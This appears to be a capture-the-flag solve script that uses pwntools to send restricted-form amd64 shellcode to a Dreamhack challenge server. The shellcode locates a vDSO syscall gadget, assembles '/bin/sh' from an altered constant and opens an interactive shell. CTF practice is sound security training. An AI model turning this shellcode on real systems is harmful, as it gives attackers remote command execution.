from pwn import *

context.arch='amd64'

HOST, PORT = '0.0.0.0', 31337
HOST, PORT = 'host3.dreamhack.games', 19236
r = remote(HOST, PORT)

sh=asm('''
    mov esp, 0x56780200
    mov esi, 0x698
    mov edx, 0

extract_stack:
    mov al, byte ptr fs:[rsi]
    mov byte ptr [rsp+rdx], al

    inc dl
    inc sil
    
    cmp dl, 8
    je done_1
    loop extract_stack

done_1:
    pop rax
    xchg rax, rsp

vdso_base:
    pop rax
    inc al
    cmp al, 0x22
    nop
    je done_2
    loop vdso_base

done_2:
    pop rsi

cld

find_syscall:
    lodsb
    inc al
    nop
    cmp al, 0x10
    je check_2
    loop find_syscall

check_2:
    lodsb
    inc al
    nop
    cmp al, 0x6
    je done_3
    loop find_syscall

done_3: 
    sub sil, 2
    push rsi
    pop rdx

main:
    mov esp, 0x56780200
    mov rax, 0x0068722e6e68622e
    push rax
    inc byte ptr [rsp]    
    inc byte ptr [rsp+2]    
    inc byte ptr [rsp+4]

    mov eax, 4
    inc al
    inc byte ptr [rsp+rax]

    push rsp
    pop rsi

    mov eax, 0x242
    shr ah, 1
    push rdx
    mov edx, 0
    ret 0
''')
sh = bytearray(x//2 for x in sh)
r.send(sh)
r.interactive()